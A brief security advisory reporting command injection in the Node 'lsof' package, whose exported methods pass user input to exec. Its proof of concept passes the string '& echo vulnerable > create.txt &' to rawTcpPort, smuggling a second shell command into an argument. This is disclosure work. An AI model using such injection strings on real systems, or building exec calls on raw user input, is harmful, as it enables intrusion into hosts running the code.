# Overview

`lsof` is a lsof processor for node, this package are vulnerable to Command Injection.

Multiple areas of the package is vulnerable to command injection. Every exported method used by the packages uses the exec function to parse user input.

# Proof of Concept

```
var root = require("lsof");
var attack_code = "& echo vulnerable > create.txt &";
root.rawTcpPort(attack_code, function(){});
```
